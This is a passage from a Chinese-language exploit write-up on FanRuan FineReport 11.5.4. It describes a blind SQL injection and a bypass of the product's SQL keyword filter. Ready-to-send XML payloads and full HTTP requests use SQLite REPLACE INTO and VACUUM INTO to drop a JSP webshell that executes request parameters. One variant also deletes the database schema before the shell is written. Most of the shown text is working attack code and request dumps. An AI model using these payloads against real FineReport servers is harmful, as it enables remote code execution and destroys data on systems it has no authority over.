Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Origin: http://192.168.197.130:8075
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.197.130:8075/webroot/decision/v10/entry/access/a07d49da-fbe3-46f5-9b81-455d32b2ca8b?width=1407&height=1106
Content-Length: 83



```



![](./assets/1519652430526424380)





 



![](./assets/5397633256244539615)

但可惜，这里没有回显只能盲打sql。



## getshell



 



正当主播觉得都能执行任意sql语句了，getshell岂不是手到擒来。没想到11.5.4的版帆软给主包狠狠地上了一课。与2024年的/view/ReportServer 远程代码执行漏洞相比，新版帆软对SQL语句进行了更严格的校验。



 



新版帆软增加了对 `\ufeff`的过滤，以前的sqlite小技巧不再可用。



 





```plain

    private static boolean isSpecialCharacter(char c) {
        return c == ',' || c == '\n' || c == ';' || c == '\t' || c == '\r' || c == '\f' || c == 11 || c == '\ufeff';
    }
    

```



依旧去除了注释符和空格



 



![](./assets/1726945558030722883)





 



同时会对关键字进行检测，检测列表为：



 



![](./assets/416862759267438641)





 



虽然只有4个关键字，但是使用常规手段是不能轻易落地写文件。于是主播下载了11.5.5版本的帆软，和11.5.4 diff了一下，果然发现 `InsecurityElement`有变动：



 



![](./assets/2520627305205133024)





 



新增了对 `vacuum`、 `pragma`、 `replace`、 `detach`的检测。主包对sqlite不是很了解，AI了一下发现 `vacuum`可以导出数据库，导出位置与文件名通过 `into`关键字指定； `replace`相当于 `insert`和 `update`的组合，那岂不是把shell写入数据库，然后导出成jsp文件就可以了？于是payload就可以这么写：



 





```xml

<R>
    <Parameters a="1">
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('CREATE+TABLE+shell_data1+%28payload+text%29%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p2"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('REPLACE+INTO+shell_data1+VALUES+%28%27%3C%25+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B+%25%3E%27%29%3B%29'),1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p3"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('VACUUM+INTO+%27..%2Fwebapps%2Fwebroot%2Fwaibiwaibi.jsp%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
    <LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
</R>

```



如果在windows下，还需要开启jsp的解析，用如下方法即可：



 





```plain

GET /webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class HTTP/1.1
Host: 192.168.197.130:8075
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Tablet/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate


```



但是这么直接导出有个大问题， `VACUUM`会将整个数据库导出，虽然其中确实包含了webshell代码，但是sqlite的二进制文件中，会有许多特殊字符，很可能导致jsp编译失败，从日志中可以看到类似的错误信息：  



 



![](./assets/3219268384831854015)





 



当数据库很大时，几乎一定会出现特殊字符，而且导出的jsp文件也会非常大。这个时候可以使用删库大法，先备份原数据库->删库->写入webshell->vacuum导出->重建数据库，于是payload可以这么写：



 





```xml

<R>
    <Parameters a="1">
        <Parameter>
            <Attributes name="p0"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('VACUUM+INTO+%27.%2Ffrdemo.db.bak%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('PRAGMA+writable_schema%3D1%3B'),1,1)-sql('FRDemo',"delete from sqlite_schema",1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p2"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('CREATE+TABLE+t1+%28p+text%29%3B%29'),1,1)-sql('FRDemo',DECODE('REPLACE+INTO+t1+VALUES+%28%27%3C%25+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B+%25%3E%27%29%3B%29'),1,1)-sql('FRDemo',"COMMIT",1)-sql('FRDemo',DECODE('VACUUM+INTO+%27..%2Fwebapps%2Fwebroot%2Fwaibiwaibi.jsp%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
    <LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
</R>

```



压缩一下发送，数据包如下：



 





```plain

GET /webroot/decision/nx/report/v9/largedataset/export/excel HTTP/1.1
Host: 192.168.197.130:8075
User-Agent: Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Tablet/15E148 Safari/604.1
Upgrade-Insecure-Requests: 1
sessionID: e46cd7cc-781d-4dd0-8aa9-0f986bfc8065
params: %3CR%3E%3CParameters+a%3D%221%22%3E%3CParameter%3E%3CAttributes+name%3D%22p0%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27VACUUM%2BINTO%2B%2527.%252Ffrdemo1.db.bak%2527%253B%27%29%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3CParameter%3E%3CAttributes+name%3D%22p1%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27PRAGMA%2Bwritable_schema%253D1%253B%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2C%22delete+from+sqlite_schema%22%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3CParameter%3E%3CAttributes+name%3D%22p2%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27CREATE%2BTABLE%2Bt1%2B%2528p%2Btext%2529%253B%2529%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2CDECODE%28%27REPLACE%2BINTO%2Bt1%2BVALUES%2B%2528%2527%253C%2525%2BRuntime.getRuntime%2528%2529.exec%2528request.getParameter%2528%2522cmd%2522%2529%2529%253B%2B%2525%253E%2527%2529%253B%2529%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2C%22COMMIT%22%2C1%29-sql%28%27FRDemo%27%2CDECODE%28%27VACUUM%2BINTO%2B%2527..%252Fwebapps%252Fwebroot%252Fwaibiwaibi.jsp%2527%253B%27%29%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3C%2FParameters%3E%3CLargeDatasetExcelExportJS+exportFileName%3D%22waibiwaibi%22+dsName%3D%22ds1%22+colNames%3D%22%7B%7D%22+exportFormat%3D%22excel%22+encodeFormat%3D%22UTF-8%22%2F%3E%3C%2FR%3E
__parameters__: {}
functionParams: {}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Origin: http://192.168.197.130:8075
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.197.130:8075/webroot/decision/v10/entry/access/a07d49da-fbe3-46f5-9b81-455d32b2ca8b?width=1407&height=1106
Content-Length: 83



```



![](./assets/3973743421800478572)





 



到这里帆软已经被狠狠地注入了shell。



 



![](./assets/9143216075282006922)





 



不过为了能顺利写shell，需要删个库，还是有风险的，而且需要使用sqlite作为数据库，通用性不是那么的好。



 



